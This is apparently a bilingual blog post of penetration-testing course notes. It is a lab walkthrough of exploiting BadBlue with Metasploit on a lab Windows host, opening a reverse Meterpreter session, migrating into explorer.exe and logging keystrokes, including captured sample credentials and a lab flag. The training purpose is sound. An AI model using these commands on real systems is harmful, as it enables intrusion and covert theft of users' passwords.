---
layout: post
title: "Windows Keylogging"
date: "2023-03-02"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# Windows Keylogging
## Keylogging
Keylogging is the process of recording or capturing the keystrokes entered on a target system.

This technique is not limited to post exploitation, there are plenty of programs and USB devices that can be used to capture and transmit the keystrokes entered on a system.

Meterpreter on a Windows system provides us with the ability to capture the keystrokes entered on a target system and download them back to our local system.

# Windows 键盘记录
## 键盘记录
键盘记录是记录或捕获在目标系统上输入的击键的过程。

这种技术不限于后期利用，有大量程序和 USB 设备可用于捕获和传输在系统上输入的击键。

Windows 系统上的 Meterpreter 使我们能够捕获在目标系统上输入的击键并将它们下载回我们的本地系统。

# Demo: Windows Keylogging（演示：Windows 键盘记录）
Keylogging is not just part of a penetration test or post exploitation for that matter. It's also used by intelligence agencies and governments to monitor people to gather data, as well as malicious actors. The typical way or the typical access vector is they would gain access to your target system either physically or remotely and install a piece of keylogging software that runs in the background. Or some of the other techniques that are leveraged or that are utilized are malicious USB devices that are plugged in at the back of the system. And they capture all the keystrokes or all the input that's being inputted by your keyboard and mouse as well, and then sends that data back onto the attacker's system, or to the system that has been specified by the actual malicious actor.

Why is this important? We don't want to interact with the target system via RDP because it's too much of a risk. And we risk getting caught because we're physically interacting with the system with a mouse and clicking around. We can set up keylogging through Meterpreter so that every keystroke or every piece of data that's entered by the user on the target system like website passwords, maybe other credentials will all be captured. And then we can get that data back and then utilize that data to exploit the target environment further or to gain access to some of the websites or accounts that the target individual is logging into.

Target IP Address: 10.2.23.135

We'll enable the keylogger and then head over to the target system, type in a few usernames and passwords. We're enter some data with a keyboard and then see that indeed it does work.

The reason we're starting the PostgreSQL Database Service in this case is because all of the keystrokes will be saved within the Metasploit Framework database within our current workspace.

```
service postgresql start && msfconsole
workspace -a Keylogging
search badblue
setg RHOSTS 10.2.23.135
use exploit/windows/http/badblue_passthru
show options
set target BadBlue\ EE\ 2.7\ Universal
exploit
```

Perform some quick enumeration here.

```
meterpreter > sysinfo
Architecture : x64
Meterpreter : x86/windows
meterpreter > getuid # Get user id
Server username: WIN-OMCNBKR66MN\Administrator
```

We currently have Administrator access.

Get started with the keylogging.

But before we do that, I'm going to migrate to the Explorer.exe process because, for some reason, the keylogging functionality within Meterpreter doesn't work very well when it's not done on the Explorer process or when we don't have access or Meterpreter's not running within the Explorer process.

Search for Explorer.exe.

```
meterpreter > pgrep explorer
2312
```

And we can migrate to 2312.

```
meterpreter > migrate 2312
```

That will give us a 64-bit Meterpreter session.

Open up the documentation for Meterpreter.

```
meterpreter > help
Stdapi: User interface Commands
================================
Command            Description
-------            -----------
keyscan_dump       Dump the keystroke buffer
keyscan_start      Start capturing keystrokes
keyscan_stop       Stop capturing keystrokes
```

```
Stdapi：用户界面命令
================================
命令说明
------ ----------
keyscan_dump 转储击键缓冲区
keyscan_start 开始捕获击键
keyscan_stop 停止捕获击键
```

Head over to the target machine. Open up a Notepad session so that we can enter some test data and see whether it's being captured.

Head over back to the attacker machine.

```
meterpreter > keyscan_start
```

That's going to start the key stroke sniffer.

Head over to the target machine.

Notepad:

```
Username:Admin
Password:hacked321
```

Any data that's being input by the keyboard, whether it's in the browser or within any text editor like Notepad or any input from the keyboard is going to be captured, so it's not limited just to Notepad.

That will dump the buffer.

```
meterpreter > keyscan_dump
```

It will dump the captured keystroke. It highlights some of the function keys. And the reason it's saying `<Shift>` is because I set this to uppercase. Whenever you're working with the keyboard, you use shift to set the letter to uppercase. 

Notepad:

```
This is some sample data
```

```
meterpreter > keyscan_dump
```

Open up a PowerShell session here.

```
PS C:\Users\Administrator> ipconfig
```

That'll give us all the interfaces.

```
meterpreter > keyscan_dump
```

And in this case, it doesn't capture that.

What we can do is stop the key scan sniffer. And then start it again.

```
meterpreter > keyscan_stop
meterpreter > keyscan_start
```

You may experience this issue.

Type in `ipconfig` on the target.

```
PS C:\Users\Administrator> ipconfig
```

```
meterpreter > keyscan_dump
```

You may need to start and stop it depending on the application that's currently being used on the target system.

That is the process of performing keylogging on a Windows system. This can be very helpful in capturing important data that the user on the target system may be entering.

# Windows: File and Keylogging
## Overview
Metasploit is one of the most popular pentesting tools. With features such as migrating into other processes, keylogging, etc it makes windows exploitation particularly easy. 

In this lab exercise, you are provided with GUI access to the attacker machine and the windows target machine. This allows you to experience the perspective of both the attacker and the victim at the same time. 

Your task is to exploit the application using an appropriate Metasploit module and complete the below-mentioned objectives. 

Objective: 

* Retrieve the flag.
* Create a file on the desktop which contains the text "You have been Hacked"
* From the Metasploit session, open the file in notepad on the target machine.
* Use the keylogger to log the commands typed on the victim machine.

Instructions:

* Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.
* The IP address of the target machine is mentioned in the file “/root/Desktop/target”
* Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1

## Solutions
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-1955.pdf

# Windows：文件和键盘记录
## 概述
Metasploit 是最流行的渗透测试工具之一。借助迁移到其他进程、键盘记录等功能，它使 Windows 漏洞利用变得特别容易。 

在本实验练习中，您将获得对攻击机和 Windows 目标机的 GUI 访问权限。这使您可以同时体验攻击者和受害者的视角。 

您的任务是使用适当的 Metasploit 模块利用应用程序并完成以​​下目标。 

目标： 

* 获取旗帜。
* 在桌面上创建一个包含文本“You have been Hacked”的文件
* 在 Metasploit 会话中，在目标机器上的记事本中打开该文件。
* 使用键盘记录器记录在受害机器上键入的命令。

指示：

* 你的 Kali 机器有一个 IP 地址为 10.10.XY 的接口运行“ip addr”来知道 X 和 Y 的值。
* 目标机器的 IP 地址在文件“/root/Desktop/target”中提到
* 不要攻击位于 IP 地址 192.V.W1 和 10.10.X.1 的网关

## 解决方案
本实验室的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-1955.pdf

# 复现视频内容
Target IP Address : 10.0.22.53

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 12 database server: main.
msf5 > workspace -a Keylogging
[*] Added workspace: Keylogging
[*] Workspace: Keylogging
msf5 > search badblue

Matching Modules
================

   #  Name                                       Disclosure Date  Rank   Check  Description
   -  ----                                       ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_ext_overflow  2003-04-20       great  Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   1  exploit/windows/http/badblue_passthru      2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow


msf5 > use exploit/windows/http/badblue_passthru
msf5 exploit(windows/http/badblue_passthru) > show options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf5 exploit(windows/http/badblue_passthru) > setg RHOSTS 10.0.22.53
RHOSTS => 10.0.22.53
msf5 exploit(windows/http/badblue_passthru) > set target 
set target 0                            set target BadBlue\ 2.72b\ Universal    
set target 1                            set target BadBlue\ EE\ 2.7\ Universal  
msf5 exploit(windows/http/badblue_passthru) > set target BadBlue\ EE\ 2.7\ Universal 
target => BadBlue EE 2.7 Universal
msf5 exploit(windows/http/badblue_passthru) > exploit

[*] Started reverse TCP handler on 10.10.21.5:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (180291 bytes) to 10.0.22.53
[*] Meterpreter session 1 opened (10.10.21.5:4444 -> 10.0.22.53:49258) at 2023-03-02 15:56:04 +0530

meterpreter > 

```
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator

```

```

Retrieve the flag.

```
meterpreter > search -f flag.txt
Found 1 result...
    c:\flag.txt (32 bytes)
meterpreter > cat c:\\flag.txt
70a569da306697d64fc6c19afea37d94
```

或者

```
meterpreter > shell
Process 2100 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\BadBlue\EE>cd /
cd /

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\

09/16/2020  09:01 AM                32 flag.txt
08/22/2013  03:52 PM    <DIR>          PerfLogs
08/12/2020  04:13 AM    <DIR>          Program Files
09/11/2020  08:17 AM    <DIR>          Program Files (x86)
09/10/2020  09:50 AM    <DIR>          Users
09/11/2020  08:18 AM    <DIR>          Windows
               1 File(s)             32 bytes
               5 Dir(s)   9,285,087,232 bytes free

C:\>type flag.txt
type flag.txt
70a569da306697d64fc6c19afea37d94

```

Create a file on the desktop which contains the text "You have been Hacked"

```
meterpreter > pwd
C:\Users\Administrator\Desktop
meterpreter > edit cracked.txt
meterpreter > cat cracked.txt 
You have been Hacked

```

或者

```
C:\>cd Users\\Administrator\\Desktop
cd Users\\Administrator\\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\Users\Administrator\Desktop

09/11/2020  08:18 AM    <DIR>          .
09/11/2020  08:18 AM    <DIR>          ..
09/11/2020  08:17 AM             1,050 BadBlue Enterprise Edition.lnk
               1 File(s)          1,050 bytes
               2 Dir(s)   9,290,272,768 bytes free

C:\Users\Administrator\Desktop>echo "You have been hacked" > hacked.txt
echo "You have been hacked" > hacked.txt
```

From the Metasploit session, open the file in notepad on the target machine.

```
meterpreter > pwd
C:\Users\Administrator\Desktop
meterpreter > execute -f notepad.exe -a cracked.txt
Process 1808 created.
```

```
meterpreter > help execute
Usage: execute -f file [options]
Executes a command on the remote machine.

OPTIONS:

    -H        Create the process hidden from view.
    -a <opt>  The arguments to pass to the command.
    -c        Channelized I/O (required for interaction).
    -d <opt>  The 'dummy' executable to launch when using -m.
    -f <opt>  The executable command to run.
    -h        Help menu.
    -i        Interact with the process after creating it.
    -k        Execute process on the meterpreters current desktop
    -m        Execute from memory.
    -s <opt>  Execute process in a given session as the session user
    -t        Execute process with currently impersonated thread token

```

```
用法：执行-f文件[选项]
在远程机器上执行命令。

选项：

     -H 创建隐藏的进程。
     -a <opt> 传递给命令的参数。
     -c 通道化 I/O（交互需要）。
     -d <opt> 使用 -m 时要启动的“虚拟”可执行文件。
     -f <opt> 要运行的可执行命令。
     -h 帮助菜单。
     -i 创建进程后与进程交互。
     -k 在meterpreters当前桌面执行进程
     -m 从内存中执行。
     -s <opt> 作为会话用户在给定会话中执行进程
     -t 使用当前模拟的线程令牌执行进程
```

或者

```
C:\Users\Administrator\Desktop>hacked.txt
hacked.txt

```

Use the keylogger to log the commands typed on the victim machine.

```
meterpreter > pgrep explorer
2472
meterpreter > migrate 2472
[*] Migrating from 2844 to 2472...
[*] Migration completed successfully.
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows

```

```
meterpreter > help
Stdapi: User interface Commands
===============================

    Command        Description
    -------        -----------
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes

```

```
meterpreter > keyscan_start
Starting the keystroke sniffer ...
```

```
Username:Admin
Password:hacked321
```

```
meterpreter > keyscan_dump
Dumping captured keystrokes...
<^H>keyscan<CR>
<Caps Lock>U<Caps Lock>sername<Shift>:<Caps Lock>A<Caps Lock>dmin<CR>
<Caps Lock>P<Caps Lock>assword<Shift>:hacked321
```

```
This is some sample data
```

```
meterpreter > keyscan_dump
Dumping captured keystrokes...
<CR>
<Caps Lock>T<Caps Lock>his is some sm<^H>ample data<^C>

```

PowerShell:

```
PS C:\Users\Administrator> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::e835:6841:6cec:c9c4%12
   IPv4 Address. . . . . . . . . . . : 10.0.22.53
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.0.16.1

Tunnel adapter isatap.ap-southeast-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal
```

```
meterpreter > keyscan_dump
Dumping captured keystrokes...


```

```
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
meterpreter > keyscan_start
Starting the keystroke sniffer ...
```

PowerShell:

```
PS C:\Users\Administrator> ipconfig
```

```
meterpreter > keyscan_dump
Dumping captured keystrokes...
ipconfig<CR>
```

或者

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                           Path
 ---   ----  ----                  ----  -------  ----                           ----
 2536  2528  explorer.exe          x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\explorer.exe
 2920  2536  badblue.exe           x86   1        WIN-OMCNBKR66MN\Administrator  C:\Program Files (x86)\BadBlue\EE\badblue.exe
```

```
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > migrate 2536
[*] Migrating from 2920 to 2536...
[*] Migration completed successfully.
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows

```